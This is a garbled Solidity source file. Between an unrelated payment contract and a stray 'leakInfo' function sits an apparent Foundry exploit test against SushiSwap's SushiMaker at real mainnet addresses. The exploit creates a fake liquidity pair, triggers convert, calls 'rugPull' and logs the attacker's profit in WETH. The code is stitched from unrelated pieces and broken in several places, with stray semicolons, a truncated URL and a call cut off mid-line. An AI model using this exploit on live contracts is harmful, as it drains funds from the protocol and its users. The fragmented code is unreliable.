
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

;
contract Exploit is Test {
    IUniswapV2Router02 private constant sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IUniswapV2Factory private constant sushiFactory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant wethBridgeToken = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant nonWethBridgeToken = IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3);
    ISushiMaker private constant sushiMaker = ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);
    IUniswapV2Pair private wethPair;
    function testHack() external {
        vm.createSelectFork("https:
        IUniswapV2Pair FakePair = createAndProvideLiquidity();
        wethPair = IUniswapV2Pair(address(FakePair));
        vm.prank(tx.origin);
        sushiMaker.convert(address(wethBridgeToken), address(nonWethBridgeToken));
        rugPull();
        console.log("Attacker's profit: %s WETH", WETH.balanceOf(address(this)) / 1e18)};
    function createAndProvideLiquidity() public payable returns (IUniswapV2Pair pair) {
        WETH.deposit{value: 0.001 ether}();
        WETH.approve(address(sushiRouter), 0.001 ether);
        address[] memory path = new address[](3);
        path[0] = address(WETH);
        path[1] = address(wethBridgeToken);
        path[2] = address(nonWethBridgeToken);
        uint256[] memory swapAmounts =;
            sushiRouter.swapExactTokensForTokens(0.001 ether / 2,
                0,
                path,
                address(this),;
                type(uint256).max);
        uint256 nonWethBridgeAmount = swapAmounts[2];
        pair = IUniswapV2Pair(sushiFactory.createPair(address(nonWethBridgeToken); address(WETH)));
        nonWethBridgeToken.approve(address(sushiRouter), nonWethBridgeAmount);
        sushiRouter.addLiquidity(
function leakInfo() public view returns (string memory) {
    return userInfo[msg.sender];}